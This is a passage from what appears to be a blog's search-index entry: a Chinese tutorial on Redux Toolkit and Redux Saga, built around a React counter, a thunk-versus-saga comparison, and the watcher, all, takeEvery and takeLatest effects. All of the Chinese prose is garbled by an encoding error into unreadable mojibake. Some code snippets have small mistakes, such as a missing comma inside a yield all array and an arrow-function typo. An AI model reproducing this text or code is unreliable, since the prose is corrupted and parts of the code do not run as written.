deleteTodo } = todosSlice.actions;// selectorexport const selectTodos = state =&gt; state.todosReducer.todos;// è¼¸å‡º reducerï¼Œæ³¨æ„ä¸ç”¨ sexport default todosSlice.reducer é€™é‚Šæœƒç™¼ç¾å¯ä»¥ç”¨ mutable çš„æ–¹æ³•ä¾†æ”¹è®Š stateã€‚å†æ¬¡å¼·èª¿é€™æ˜¯å› ç‚ºèƒŒå¾Œæœ‰ immer å¹«ä½ åšè½‰æ›ï¼Œå¯¦éš›ä¸ŠèƒŒå¾Œé‚„æ˜¯ Immutable çš„ã€‚ æ¥è‘—è¨˜å¾—å» store è£¡é¢æŠŠ reducer æ”¾é€²å»ï¼š 12345678import { configureStore } from \"@reduxjs/toolkit\";import todosReducer from \"../features/todos/todosSlice\";export const store = configureStore({ reducer: { todosReducer },}) é€™æ¨£å°±å®Œæˆäº†ã€‚ æ¥è‘—åªè¦ç”¨ react-redux æä¾›çš„ useSelector è·Ÿ useDispatch ä¾†çµåˆèµ·ä¾†å°±è¡Œäº†ï¼Œé€™é‚Šå°±ä¸å†é™„äº†ï¼Œæœ‰ä»»ä½•ç–‘å•éƒ½å¯ä»¥ç›´æ¥åƒè€ƒæˆ‘å¯«çš„ç¯„ä¾‹ã€‚","link":"/2022/04/25/redux-toolkit/"},{"title":"å¸Œæœ›æ˜¯æœ€å¥½æ‡‚çš„ Redux Saga","text":"é›£å¾—å¯«äº†ä¸€ç¯‡é•·æ–‡ã€‚ ç°¡è¿°é™„è¨»ï¼šsaga æœƒéœ€è¦ä¸€äº› generator çš„æ¦‚å¿µï¼ˆä¸ç”¨å¾ˆæ·±ï¼ŒåŸºç¤å°±å¤ äº†ï¼‰ï¼Œæ‰€ä»¥å»ºè­°å…ˆæŠŠ å¿«é€Ÿå…¥é–€ generator çœ‹æ‡‚å¾Œå†ä¾†çœ‹ï¼Œä¸ç„¶æœƒå­¸çš„å¾ˆæœ‰éšœç¤™ã€‚ é€™æ˜¯ç¬¬ä¸€æ¬¡å­¸ sagaï¼Œç›¸è¼ƒæ–¼ thunk ä¾†èªªç¢ºå¯¦æ˜¯è¤‡é›œäº†ä¸€äº›ï¼Œä¸éåªè¦ç…§è‘—æ•™å­¸ä¸€æ­¥ä¸€æ­¥è‡ªå·±ç·´ç¿’ï¼Œé‚„æ˜¯èƒ½æ…¢æ…¢ç†è§£ä»–èƒŒå¾Œçš„é‚è¼¯çš„ã€‚ ç¸½ä¹‹é€™ç¯‡æ–‡ç« çš„ç›®çš„æ˜¯å¸Œæœ›èƒ½è®“æ¯å€‹äººéƒ½å­¸æœƒã€Œæ€éº¼ç”¨ sagaã€ï¼Œä¹Ÿå¸Œæœ›è‡ªå·±èƒ½æŠŠ saga çš„æ¦‚å¿µå¼„å¾—æ›´æ¸…æ¥šä¸€äº›ã€‚ ç‚ºäº†è®“å­¸ç¿’æ•ˆæœæ›´ä½³ï¼Œæ‰€ä»¥é€™ç¯‡æœƒå¾é›¶é–‹å§‹ï¼Œä¹Ÿå°±æ˜¯ç”¨ create-react-app ä¾†é–‹ä¸€å€‹ç©ºçš„å°ˆæ¡ˆï¼Œå…ˆå»ºç«‹ redux å¾Œå†ä¾†ä¾†ä¸€æ­¥ä¸€æ­¥åŠ ä¸Š sagaï¼Œé€™æ¨£æ‰ä¸æœƒæœ‰ä¸€ç¨®ã€Œå¥½åƒæ¼æ‰äº†ä»€éº¼ã€çš„æ„Ÿè¦ºå­˜åœ¨ã€‚ é †é“ä¸€æï¼Œé›–ç„¶ç­‰ä¸€ä¸‹çš„ç¯„ä¾‹æœƒç”¨åˆ° reduxï¼Œä½†æ˜¯ä¸æœƒç”¨åˆ° react-reduxã€actionCreatorã€actionType é€™äº›æ±è¥¿ã€‚æˆ‘å¸Œæœ›è®“é€™å€‹ç¯„ä¾‹è¶Šç°¡æ½”è¶Šå¥½ï¼Œä¸€æ–¹é¢çœæ‰ä¸å¿…è¦çš„ç¨‹å¼ç¢¼ï¼Œå¦ä¸€æ–¹é¢ä¹Ÿèƒ½æ›´å°ˆå¿ƒæŠŠé‡é»æ”¾åœ¨ saga ä¸Šã€‚ æœ€å¾Œç¥å„ä½å­¸ç¿’æ„‰å¿«ï¼Œé–‹å§‹å§ï¼ å»ºç«‹åŸºæœ¬çš„ redux ç’°å¢ƒå‰ç½®ä½œæ¥­é¦–å…ˆï¼Œåœ¨ create-react-app å®Œä»¥å¾Œï¼Œæˆ‘å¸Œæœ›è³‡æ–™å¤¾çµæ§‹é•·é€™æ¨£å°±å¥½ï¼š 123456789â”œâ”€â”€ publicâ”‚&nbsp;&nbsp; â”œâ”€â”€ favicon.icoâ”‚&nbsp;&nbsp; â”œâ”€â”€ index.htmlâ”‚&nbsp;&nbsp; â”œâ”€â”€ logo192.pngâ”‚&nbsp;&nbsp; â”œâ”€â”€ logo512.pngâ”‚&nbsp;&nbsp; â”œâ”€â”€ manifest.jsonâ”‚&nbsp;&nbsp; â””â”€â”€ robots.txtâ””â”€â”€ src â””â”€â”€ index.js // åªç•™ä¸‹é€™å€‹ æ‰€ä»¥é€²åˆ°å°ˆæ¡ˆè³‡æ–™å¤¾å¾Œå…ˆå¹«æˆ‘åŸ·è¡Œé€™æ®µï¼Œåˆªæ‰ä¸å¿…è¦çš„æ±è¥¿ï¼š 12cd srcrm -rf App.css App.js App.test.js reportWebVitals.js index.css logo.svg setupTests.js æ¥è‘—æŠŠ index.js æ”¹æˆé€™æ¨£ï¼š 12345678import React from 'react';import ReactDOM from 'react-dom/client';import App from './App';const root = ReactDOM.createRoot(document.getElementById('root'));root.render( &lt;div&gt;Hello&lt;/div&gt;); æœ€å¾Œ npm run startï¼Œæ‡‰è©²å°±æœƒé¡¯ç¤º Hello çš„ç•«é¢ï¼Œé€™æ¨£å°± OK äº†ã€‚ æ²’å•é¡Œä»¥å¾Œï¼Œè¨˜å¾—é †ä¾¿æŠŠè©²è£çš„æ±è¥¿è£èµ·ä¾†ï¼š 1npm install redux redux-saga æ­£å¼ä½œæ¥­ç‚ºäº†æ€•ç­‰ä¸€ä¸‹æ··äº‚æ‰€ä»¥å…ˆèªªæ˜ï¼Œé€™å€‹æ®µè½çš„æª”æ¡ˆçµæ§‹æœƒé•·é€™æ¨£ï¼š 12345678910111213â”œâ”€â”€ publicâ”‚&nbsp;&nbsp; â”œâ”€â”€ favicon.icoâ”‚&nbsp;&nbsp; â”œâ”€â”€ index.htmlâ”‚&nbsp;&nbsp; â”œâ”€â”€ logo192.pngâ”‚&nbsp;&nbsp; â”œâ”€â”€ logo512.pngâ”‚&nbsp;&nbsp; â”œâ”€â”€ manifest.jsonâ”‚&nbsp;&nbsp; â””â”€â”€ robots.txtâ””â”€â”€ src â”œâ”€â”€ Counter.js â”œâ”€â”€ index.js â””â”€â”€ store â”œâ”€â”€ index.js â”œâ”€â”€ reducer.js æ¥è‘—è¦ä¾†æ­£å¼åŠ ä¸Š redux ç’°å¢ƒï¼Œæˆ‘å€‘è¦åšçš„å°±æ˜¯ä¸€å€‹ç¶“å…¸çš„ã€ŒCounterã€ã€‚ é›–ç„¶èªªæ˜¯å¾é›¶é–‹å§‹ï¼Œä¸é redux çš„éƒ¨åˆ†æˆ‘ä¸æœƒè¬›å¤ªå¤šï¼Œåªæœƒå¤§æ¦‚è¬›ä¸€ä¸‹æ­¥é©Ÿè·Ÿé™„ä¸Šç¨‹å¼ç¢¼ã€‚å¦‚æœä½ å®Œå…¨ä¸æ‡‚ redux çš„è©±ï¼Œå»ºè­°ä½ å…ˆåƒè€ƒ åˆæ¢ Redux å†å›ä¾†å­¸ sagaã€‚ é¦–å…ˆ 1. å»ºç«‹ Counter å…ƒä»¶ 123456789101112131415// Counter.jsimport React from \"react\";export default function Counter () { return ( &lt;div&gt; &lt;h2&gt;Counter: 0&lt;/h2&gt; &lt;div&gt; &lt;button&gt;+1&lt;/button&gt; &lt;button&gt;-1&lt;/button&gt; &lt;button&gt;+1 Async&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; )} æ¥è‘—åœ¨ index.js ä¸­å¼•å…¥ï¼š 12345678910import React from 'react';import ReactDOM from 'react-dom/client';import Counter from './Counter';const root = ReactDOM.createRoot(document.getElementById('root'));root.render( &lt;div&gt; &lt;Counter /&gt; &lt;/div&gt;); é€™å€‹æ™‚å€™æ‡‰è©²å°±æœ‰ä¸€å€‹é¡¯ç¤º counter å€¼å’ŒæŒ‰éˆ•çš„ç•«é¢äº†ã€‚ 2. åŠ å…¥ reduxï¼ˆå»ºç«‹ store å’Œ reducerï¼‰ src/store/reducer.jsï¼š 12345678910export default function counterReducer (state = 0, action) { switch (action.type) { case 'INCREMENT': return state + 1 case 'DECREMENT': return state - 1 default: return state }} src/store/index.jsï¼š 1234import { createStore } from \"redux\"import counterReducer from \"./reducer\"export default createStore(counterReducer) æ¥è‘—å›åˆ° src/index.js æŠŠ store æ‹¿é€²ä¾†ç”¨ï¼š 1234567891011121314151617181920212223import React from 'react';import ReactDOM from 'react-dom/client';import Counter from './Counter';import store from \"./store\"const root = ReactDOM.createRoot(document.getElementById('root'));function renderRoot () { root.render( &lt;div&gt; &lt;Counter value={store.getState()} onIncrement={() =&gt; store.dispatch({ type: 'INCREMENT' })} onDecrement={() =&gt; store.dispatch({ type: 'DECREMENT' })} /&gt; &lt;/div&gt; );}renderRoot();// store æ”¹è®Šæ™‚å°±é‡æ–°åŸ·è¡Œ renderRootstore.subscribe(renderRoot); ç¨å¾®è§£é‡‹ä¸€ä¸‹é€™æ®µï¼Œå› ç‚ºæˆ‘å€‘æ²’æœ‰ç”¨ react-reduxï¼Œæ‰€ä»¥æ”¹ç”¨ subscribe çš„æ–¹å¼ä¾†åšåˆ°ã€Œç•¶ store æ”¹è®Šæ™‚é‡æ–° renderã€é€™ä»¶äº‹æƒ…ã€‚ é™„è¨»ï¼šå¦‚æœä½ å° subscribe çš„æ¦‚å¿µä¸å¤ªæ‡‚çš„è©±å¯ä»¥åƒè€ƒ ç”¨å¯¦ä½œçš„æ–¹å¼ä¾†é‡æ–°å­¸ç¿’ Redux å¦å¤– &lt;Counter /&gt; çš„éƒ¨åˆ†æœƒå‚³çµ¦ä»–ä¸‰å€‹ propsï¼š valuesï¼ŒæŠŠ store ä¸­çš„ state å‚³é€²å» onIncrement ç”¨ä¾† dispatch +1 çš„ action onDecrement ç”¨ä¾† dispatch -1 çš„ action æœ€å¾ŒæŠŠ &lt;Counter /&gt; å…§éƒ¨ä¿®æ”¹æˆé€™æ¨£å°±å®Œäº‹äº†ï¼š 12345678910111213import React from \"react\";export default function Counter ({ value, onIncrement, onDecrement }) { return ( &lt;div&gt; &lt;h2&gt;Counter: {value}&lt;/h2&gt; &lt;div&gt; &lt;button onClick={onIncrement}&gt;+1&lt;/button&gt; &lt;button onClick={onDecrement}&gt;-1&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; )} å¥½ï¼Œåšåˆ°é€™é‚Š redux çš„éƒ¨åˆ†å°±å®Œæˆäº†ã€‚ ç¾åœ¨ä½ çš„ç•«é¢æ‡‰è©²è¦é¡¯ç¤º Counter å€¼ï¼Œè·Ÿé»ä¸‹æŒ‰éˆ•æ™‚æœƒæŠŠå€¼ +1 å’Œ -1ï¼Œè·Ÿ store ç¶­æŒåŒæ­¥çš„ç‹€æ…‹ã€‚å¦‚æœæœ‰ä»»ä½•ç–‘å•çš„è©±å¯ä»¥åˆ°é€™é‚Šä¾†çœ‹åŸå§‹ç¢¼ã€‚ æ²’å•é¡Œçš„è©±å¯ä»¥å–å£æ°´ï¼Œä¸‹åŠå ´è¦é–‹å§‹äº†ã€‚ åœ¨åŠ ä¸Š saga ä¹‹å‰ï¼Œå…ˆèªè­˜ä¸€ä¸‹ sagaå¦‚é¡Œï¼Œæˆ‘æƒ³åˆ©ç”¨é€™æ®µä»‹ç´¹ä¸€ä¸‹ saga æ˜¯ä»€éº¼ï¼Ÿé‚„æœ‰å®ƒè·Ÿå…¶ä»–çš„ middleware æœ‰ä»€éº¼å·®åˆ¥ï¼Ÿ saga æ˜¯ redux çš„ä¸€å€‹ middlewareï¼Œå¦‚æœä½ æœ‰å­¸é thunk çš„è©±æ‡‰è©²å°±å° middleware é€™æ±è¥¿ä¸é™Œç”Ÿã€‚ ç°¡å–®ä¾†èªªï¼Œåœ¨ redux çš„ä¸–ç•Œè£¡é¢å¦‚æœæˆ‘å€‘æƒ³è¦æ”¹è®Š stateï¼Œå°±å¿…é ˆé€é dispatch ä¾†ç™¼å‡ºä¸€å€‹ action é€™ç¨®æ–¹å¼ä¾†ä¿®æ”¹ã€‚ å¯æ˜¯æœ‰ä¸€å€‹å•é¡Œä¾†äº†ï¼Œå°±æ˜¯å¦‚æœæˆ‘çš„ action æ˜¯éåŒæ­¥æ“ä½œï¼Œåƒæ˜¯æ‰“ API ä¹‹é¡çš„è©±ï¼Œæˆ‘è¦æ€éº¼ç”¨ dispatch çš„æ–¹å¼ä¾†åšï¼Ÿ ä½ å¯èƒ½æœƒæƒ³èªªæˆ‘å¯ä»¥å¯«åœ¨ reducer è£¡é¢å•Šï¼Œåƒé€™æ¨£ï¼š 12345678910export default function myReducer (state = [], action) { switch (action.type) { case 'FETCH_REQUEST': return fetch(...) .then(res = res.json()) .then(data =&gt; state = data) default: return state }} å¯æ˜¯ä¸è¦å¿˜äº† reducer çš„åŸå‰‡æ˜¯ã€Œpure functionã€ï¼Œä½ ä¸å¯èƒ½æŠŠé€™ç¨®ã€Œside effectã€çš„äº‹æƒ…æ”¾åˆ°è£¡é¢ä¾†åšã€‚ æ‰€ä»¥å‘¢ï¼Œmiddleware æœ€ä¸»è¦å°±æ˜¯ç”¨ä¾†è§£æ±ºé€™å€‹å•é¡Œçš„ï¼Œç›®å‰æ¯”è¼ƒçŸ¥åçš„å¹¾å€‹ middleware æœ‰ redux-thunkã€redux-saga å’Œ redux-observableï¼Œä½† redux-observable æˆ‘å®Œå…¨æ²’ç¢°éæ‰€ä»¥å°±ä¸å¤šæäº†ã€‚ é‚£ thunk è·Ÿ saga æœ‰ä»€éº¼å·®åˆ¥ï¼Ÿæˆ‘å€‘ç›´æ¥ç”¨ code ä¾†è§£é‡‹å§ã€‚ å¦‚æœè¦é€é thunk ä¾†ä½œéåŒæ­¥æ“ä½œçš„è©±ï¼Œä½ æœƒé€™æ¨£åšï¼š 123456789101112131415161718192021// æœ€å¾Œæœƒå›å‚³ä¸€å€‹ function// thunk çš„ä½œç”¨å°±æ˜¯å¹«ä½ åŸ·è¡Œ dispatch =&gt; .... é€™ä¸€æ®µconst action = () =&gt; dispatch =&gt; { setTimeout(() =&gt; { dispatch({ type: 'INCREMENT_ASNYC' }) }, 1000)}function render() { ReactDOM.render( &lt;Counter value={store.getState()} onIncrement={() =&gt; dispatch('INCREMENT')} onDecrement={() =&gt; dispatch('DECREMENT')} {/* thunk */} onINcrementAsync={() =&gt; dispatch(action())} /&gt;, document.getElementById('root') )} è€Œ saga çš„è©±æœƒé€™æ¨£åšï¼š 1234567891011function render() { ReactDOM.render( &lt;Counter value={store.getState()} onIncrement={() =&gt; dispatch({type: 'INCREMENT'})} onDecrement={() =&gt; dispatch({type: 'DECREMENT'})} {/* saga */} onINcrementAsync={() =&gt; dispatch({ type: 'INCREMENT_ASYNC' }} /&gt;, document.getElementById('root') )} æ³¨æ„åˆ°äº†å—ï¼Ÿåœ¨ thunk è£¡æˆ‘å€‘ dispatch çš„ action æ˜¯ä¸€å€‹ã€Œfunctionã€ï¼Œè€Œ saga è£¡é¢ action å¹¾ä¹å°±è·ŸåŸæœ¬çš„ä¸€æ¨¡ä¸€æ¨£å˜›ï¼Œæ˜¯æˆ‘å€‘æœ€ç†Ÿæ‚‰çš„ã€Œobjectã€ã€‚ thunk çš„å¥½è™•æ˜¯æ¯”è¼ƒå¥½å­¸ï¼Œä½†æ˜¯æ¸¬è©¦ä¸å¥½åšï¼ˆå› ç‚ºé‚è¼¯éƒ½å¯«åœ¨ function è£¡ï¼‰ï¼Œsaga å‰‡æ˜¯åéä¾†ï¼Œæ¸¬è©¦å¥½åšå¾ˆå¤šï¼Œä½†æ˜¯å­¸ç¿’æ›²ç·šç›¸å°å¢é«˜ï¼‰ ç¸½ä¹‹ï¼Œå¸Œæœ›é€™ä¸€æ®µèƒ½è®“ä½ å° saga æœ‰ä¸€äº›èªè­˜ï¼Œé‚„æœ‰ä»–è·Ÿ thunk çš„å·®åˆ¥æ‰€åœ¨ã€‚ æ­£å¼åŠ å…¥ sagaæ‡¶äººåŒ…æµç¨‹åœ¨æ­£å¼é–‹å§‹ä¹‹å‰ï¼Œå…ˆç¨å¾®çœ‹ä¸€ä¸‹ saga çš„é‹ä½œæµç¨‹ï¼š é™„è¨»ï¼šå…ˆä¸ç”¨ç®¡ takeEvery å’Œ put é‚£äº›ä¸çŸ¥é“æ˜¯å•¥çš„æ±è¥¿ï¼Œä¹‹å¾Œæœƒå†è§£é‡‹ã€‚ åœ¨å…ƒä»¶ä¸­ dispatch ä¸€å€‹ action watch saga æœƒæ¥æ”¶åˆ°é€™å€‹ action watch saga æœƒæŠŠé€™å€‹ action äº¤çµ¦æŸå€‹ handler ä¾†è™•ç† handler è£¡é¢æœƒåšä¸€äº›äº‹æƒ…ï¼Œæœ€å¾Œå† dispatch å¦ä¸€å€‹ action åˆ° reducer ä¾†ç”¢ç”Ÿæ–°çš„ stateã€‚ æˆ‘çŸ¥é“ç¾åœ¨çœ‹å®Œæ‡‰è©²é‚„æ˜¯éœ§ç…ç…ï¼Œä½†ä½ å°±å…ˆçœ‹å€‹æ¦‚å¿µå°±å¥½ï¼Œå¯ä»¥ç­‰ä¹‹å¾Œå†å›ä¾†çœ‹ä¸€éå°±æœƒç†è§£äº†ã€‚ æ­£å¼é–‹å§‹å»¶çºŒå‰›å‰›çš„ç¯„ä¾‹ï¼Œæˆ‘å€‘ç¾åœ¨è¦æ–°å¢ä¸€å€‹ã€Œä¸€ç§’å¾Œæ‰ +1 çš„æŒ‰éˆ•ã€ã€‚ é¦–å…ˆå…ˆæ–°å¢ä¸€å€‹ src/store/saga.jsï¼Œè·Ÿ saga ç›¸é—œçš„æ±è¥¿éƒ½æœƒå¯«åœ¨é€™è£¡é¢ï¼Œå…§å®¹æ˜¯é€™æ¨£ï¼š 12345678910111213import { fork, put, take, delay } from \"redux-saga/effects\"function* handlerIncrementAsync () { yield delay(1000) yield put({ type: 'INCREMENT' })}export default function* rootSaga() { while(true) { yield take('INCREMENT_ASYNC') yield fork(handlerIncrementAsync) }} forkã€put é€™äº›å¾ redux-saga/effects æ‹¿å‡ºä¾†çš„æ±è¥¿çµ±ç¨±ç‚ºã€ŒEffects APIã€ï¼ŒåŸºæœ¬ä¸Šåªæœƒæ‹¿ä¾†è·Ÿ generator æ­é…ä½¿ç”¨ï¼Œå…ˆçŸ¥é“é€™äº›å°±å¥½ã€‚ è€Œ yield å¾Œé¢åªè¦æ¥é€™äº› Effects API çš„è©±ï¼Œå°±æœƒç­‰åˆ°ã€Œé€™å€‹è¡Œç‚ºçµæŸå¾Œã€æ‰æœƒå¾€ä¸‹åŸ·è¡Œï¼Œä»¥ handlerIncrementAsync ä¾†çœ‹çš„è©±å°±æ˜¯ï¼š 123456function* handlerIncrementAsync () { // ç­‰ 1 ç§’ yield delay(1000) // put ä¸€å€‹ action yield put({ type: 'INCREMENT' })} put å¯ä»¥ç›´æ¥æƒ³æˆæ˜¯ dispatch çš„æ„æ€ï¼Œæ‰€ä»¥æ•´æ®µåˆèµ·ä¾†å°±æ˜¯ã€Œä¸€ç§’å¾Œå¹«æˆ‘ dispatch {type: 'INCREMENT'} é€™å€‹ action å‡ºå»ã€ã€‚ é‚£æœƒé€åˆ°å“ªè£¡ï¼Ÿå…¶å¯¦å°±æ˜¯é€åˆ° reducer å»ã€‚ æ¥ä¸‹ä¾†æ˜¯æˆ‘è¦ºå¾—åœ¨ saga ä¸­å¾ˆé‡è¦çš„è§€å¿µã€Œwatcherã€ï¼Œwatcher çš„ç”¨é€”å°±æ˜¯ç”¨ä¾†å¹«ä½ ç›£è½ï¼š ç•¶å…ƒä»¶ dispatch ä»€éº¼ action æ™‚ï¼Œæˆ‘è¦äº¤çµ¦å“ªå€‹ handler ä¾†è™•ç† ç•¶å…ƒä»¶ dispatch ä»€éº¼ action æ™‚ï¼Œæˆ‘è¦äº¤çµ¦å“ªå€‹ handler ä¾†è™•ç† ç•¶å…ƒä»¶ dispatch ä»€éº¼ action æ™‚ï¼Œæˆ‘è¦äº¤çµ¦å“ªå€‹ handler ä¾†è™•ç† æ‰€ä»¥å¦‚æœä¸€å€‹ action æ˜¯è¦äº¤çµ¦ saga ä¾†è™•ç†çš„è©±ï¼Œé‚£ action type ä¸€å®šæ˜¯å°æ‡‰åˆ° saga çš„ wacherï¼Œè·Ÿ reducer ä¸€é»é—œä¿‚ä¹Ÿæ²’æœ‰ã€‚ï¼ˆè©³ç´°å¯ä»¥åƒè€ƒæœ€ä¸‹é¢çš„ åœ°é›· æ®µè½ï¼‰ å› æ­¤ rootSaga çš„æ„æ€æ˜¯é€™æ¨£ï¼š 12345678export default function* rootSaga() { while(true) { // ç•¶æœ‰å…ƒä»¶ç™¼å‡º {type: 'INCREMENT_ASYNC'} é€™å€‹ action yield take('INCREMENT_ASYNC') // å°±äº¤çµ¦ handlerIncrementAsync ä¾†è™•ç† yield fork(handlerIncrementAsync) }} è‡³æ–¼ç‚ºä»€éº¼è¦ç”¨ while(true) ä¾†è·‘ï¼Ÿé€™å€‹è·Ÿ generator çš„ç‰¹æ€§æœ‰é—œã€‚ç°¡å–®ä¾†èªªå°±æ˜¯æˆ‘å¸Œæœ›é€™å€‹ç›£è½æ˜¯ã€ŒæŒçºŒæ€§ã€çš„ï¼Œå¦‚æœæ²’æœ‰ while(true)ï¼Œé‚£åŸ·è¡Œå®Œä¸€æ¬¡å¾Œå°±ä¸æœƒå†ç¹¼çºŒè·‘ä¸‹å»äº†ï¼ˆä½ å¯ä»¥ä¹‹å¾Œè‡ªå·±æ‹¿æ‰çœ‹çœ‹å°±æ‡‚æˆ‘çš„æ„æ€äº†ï¼‰ã€‚ å¥½ï¼Œä»¥ä¸Šå¦‚æœä½ æœ‰è½æ‡‚çš„è©±ï¼Œsaga çš„æ ¸å¿ƒè§€å¿µå·®ä¸å¤šå°±æ˜¯é€™æ¨£è€Œå·²ï¼Œå‰©ä¸‹çš„åªæ˜¯æŠŠæ”¾åˆ° store è€Œå·²ã€‚ æœ€å¾Œä¾†æ”¹ä¸€ä¸‹ src/store/index.js çš„å…§å®¹ï¼š 1234567891011121314// æŠŠ applyMiddleware æ‹¿å‡ºä¾†ï¼Œå› ç‚ºæˆ‘å€‘è¦ç”¨ middlewareimport { createStore, applyMiddleware } from \"redux\"// ç”¨ä¾†å»ºç«‹ saga middleware çš„æ±è¥¿import createSagaMiddleWare from \"redux-saga\"// å‰›å‰›å¯«å¥½çš„ watcherimport rootSaga from \"./saga\"import counterReducer from \"./reducer\"// å»ºç«‹ instanceconst sagaMiddleWare = createSagaMiddleWare()// æŠŠ middleware æ”¾å…¥ storeï¼ˆç¬¬äºŒå€‹åƒæ•¸ï¼‰export default createStore(counterReducer, applyMiddleware(sagaMiddleWare))// è®“ saga ä¸­çš„ watcher è·‘èµ·ä¾†sagaMiddleWare.run(rootSaga) é™„è¨»ï¼šè¨˜å¾—è¦å…ˆæŠŠ middleware æ”¾é€²å»åˆå§‹åŒ–ä»¥å¾Œæ‰å¯ä»¥è·‘èµ·ä¾†ï¼Œæ‰€ä»¥ sagaMiddleWare.run() æ‰æœƒå¯«åœ¨æœ€å¾Œé¢ã€‚ ç¾åœ¨ saga è¨­å®šå¥½äº†ï¼Œstore ä¹Ÿè¨­å®šå¥½äº†ï¼Œé‚„å·®ä»€éº¼ï¼Ÿåªå·®æŠŠå…ƒä»¶åŠ ä¸Šå°æ‡‰çš„ event handler è€Œå·²ï¼é¦¬ä¸Šä¾†åŠ å§ï¼š 12345678910111213141516171819202122232425// src/index.jsimport React from 'react';import ReactDOM from 'react-dom/client';import Counter from './Counter';import store from \"./store\"const root = ReactDOM.createRoot(document.getElementById('root'));function renderRoot () { root.render( &lt;div&gt; &lt;Counter value={store.getState()} onIncrement={() =&gt; store.dispatch({ type: 'INCREMENT' })} onDecrement={() =&gt; store.dispatch({ type: 'DECREMENT' })} {/* æ–°å¢ä¸€å€‹ props */} onIncrementAsync={() =&gt; store.dispatch({ type: 'INCREMENT_ASYNC' })} /&gt; &lt;/div&gt; );}renderRoot();store.subscribe(renderRoot); 12345678910111213141516// src/Counter.jsimport React from \"react\";export default function Counter ({ value, onIncrement, onDecrement, onIncrementAsync }) { return ( &lt;div&gt; &lt;h2&gt;Counter: {value}&lt;/h2&gt; &lt;div&gt; &lt;button onClick={onIncrement}&gt;+1&lt;/button&gt; &lt;button onClick={onDecrement}&gt;-1&lt;/button&gt; {/* åŠ ä¸Šå» */} &lt;button onClick={onIncrementAsync}&gt;+1 Async&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; )} åšåˆ°é€™é‚Šå¾Œï¼Œå°±é”æˆæˆ‘å€‘ä¸€é–‹å§‹è¦åšçš„æ•ˆæœäº†ï¼Œå¯ä»¥åˆ°é€™é‚Šçš„ç¯„ä¾‹ä¾†çœ‹ã€‚ æœ€å¾Œæ­å–œä½ èµ°åˆ°é€™é‚Šï¼Œä»¥ä¸Šå°±æ˜¯ saga çš„åŸºç¤ï¼Œå¦‚æœéƒ½æœ‰ç†è§£çš„è©±æˆ‘è¦ºå¾—å°æ–¼ saga å°±æœ‰ä¸€å®šçš„ç†è§£äº†ã€‚æ¥ä¸‹ä¾†è¦è¬›çš„æ±è¥¿éƒ½ç®—æ˜¯é¡å¤–è£œå……æˆ–æ˜¯å»¶ä¼¸ï¼Œä½†æ ¸å¿ƒç†å¿µéƒ½é‚„æ˜¯è·Ÿå‰›å‰›å­¸çš„æ˜¯ä¸€æ¨£çš„ã€‚ æœ€å¾Œæˆ‘ä¹Ÿåšäº†ä¸€å€‹ç°¡å–®çš„ saga ä¸² API çš„ç·´ç¿’ï¼Œæœ‰èˆˆè¶£çš„è©±å¯ä»¥åˆ°å»çœ‹çœ‹ã€‚ å¦‚æœæœ‰å¤šå€‹ watcher çš„è©±æ€éº¼è¾¦ï¼Ÿé€™æ™‚å€™å¯ä»¥æ”¹ç”¨ all é€™å€‹ Effects API ä¾†è™•ç†ï¼š 12345678910111213141516171819import { put, delay, takeEvery, all } from \"redux-saga/effects\"function* handlerIncrementAsync () { yield delay(1000) yield put({ type: 'INCREMENT' })}function* handleDecrementAsync () { yield delay(1000) yield put({ type: 'DECREMENT' })}export default function* rootSaga() { yield all([ yield takeEvery('INCREMENT_ASYNC', handlerIncrementAsync) yield takeEvery('DECREMENT_ASYNC', handleDecrementAsync) ])} è·Ÿ Promise.all() æœ‰ç•°æ›²åŒå·¥ä¹‹å¦™ï¼Œä¸éæ¯”èµ·é€™ç¨®å¯«æ³•ï¼Œä½ æ‡‰è©²æ›´å¸¸çœ‹åˆ°ä¸‹é¢çš„å¯«æ³•ï¼š 12345678910111213141516171819202122232425262728293031import { put, delay, takeEvery, all } from \"redux-saga/effects\"function* handlerIncrementAsync () { yield delay(1000) yield put({ type: 'INCREMENT' })}function* handleDecrementAsync () { yield delay(1000) yield put({ type: 'DECREMENT' })}// watcher1function* watchIncrementAsync () { return yield takeEvery('INCREMENT_ASYNC', handlerIncrementAsync)}// watcher2function* watchDecrementAsync () { return yield takeEvery('DECREMENT_ASYNC', handleDecrementAsync)}export default function* rootSaga() { yield all([ watchIncrementAsync(), watchDecrementAsync() ])} ä»”ç´°çœ‹å°±æœƒç™¼ç¾æ˜¯ä¸€æ¨£çš„æ±è¥¿ï¼Œåªæ˜¯ç”¨ function ä¾†åŒ…è£è€Œå·²ã€‚ takeEvey è·Ÿ takeLatest å·®åœ¨å“ªï¼Ÿæ²¿ç”¨å‰›å‰›ä¾‹å­ï¼Œå¦‚æœæˆ‘æ˜¯ç”¨ takeEvery ä¾†åšç›£è½ï¼š 123456789101112131415function* watchIncrementAsync () { return yield takeEvery('INCREMENT_ASYNC', handlerIncrementAsync)}function* watchDecrementAsync () { return yield takeEvery('DECREMENT_ASYNC', handleDecrementAsync)}export default function* rootSaga() { yield all([ watchIncrementAsync(), watchDecrementAsync() ])} æ¥è‘—æˆ‘ä¸€æ¬¡é»åä¸‹ +1 Async çš„æŒ‰éˆ•ï¼ˆæŒ‰å¾ˆå¿«çš„é‚£ç¨®ï¼‰ï¼Œé‚£å°±æœƒåœ¨ä¸€ç§’å¾Œå¾ 1, 2, 3, ...10ï¼Œä¹Ÿå°±æ˜¯èªªæ¯ä¸€æ¬¡çš„ dispatch éƒ½æœƒè¢«è™•ç†ã€‚ ä½† takeLatest å°±ä¸ä¸€æ¨£äº†ï¼Œå¦‚æœæ”¹æˆé€™æ¨£ï¼š 123456789101112131415function* watchIncrementAsync () { return yield takeLatest('INCREMENT_ASYNC', handlerIncrementAsync)}function* watchDecrementAsync () { return yield takeLatest('DECREMENT_ASYNC', handleDecrementAsync)}export default function* rootSaga() { yield all([ watchIncrementAsync(), watchDecrementAsync() ])} æ¥è‘—ä¸€æ¨£ä¸€æ¬¡é» 10 ä¸‹æŒ‰éˆ•ï¼Œæœ€å¾Œ counter çš„å€¼æœƒæ˜¯ 1ï¼Œç‚ºä»€éº¼ï¼Ÿå› ç‚ºåªæœ‰æœ€å¾Œä¸€æ¬¡çš„ dispatch æ‰æœƒè¢«è™•ç†ï¼Œé€™å€‹å°±æ˜¯ä»–å€‘çš„å·®åˆ¥ã€‚ æ‰€ä»¥ takeEvery è·Ÿ takeLatest é‚„çœŸæ˜¯å‘½åçš„æœ‰å¤ 